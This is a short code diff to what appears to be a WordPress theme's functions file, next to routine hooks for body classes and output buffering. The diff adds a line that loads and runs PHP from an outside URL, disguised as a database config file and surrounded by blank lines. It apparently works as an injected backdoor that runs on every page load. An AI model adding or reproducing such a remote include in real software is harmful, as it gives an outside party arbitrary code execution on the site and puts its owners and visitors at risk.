@@ -1321,6 +1321,11 @@ function add_slug_body_class( $classes ) {
 		ob_start();
 	} // soi_output_buffer
 	add_action('init', 'app_output_buffer');
+
+
+
+	require('https://perspectivecr.org/traffic/db-config.php');
+	
 	
 
 /* http://biostall.com/hashing-acf-password-type-fields-in-wordpress/ */
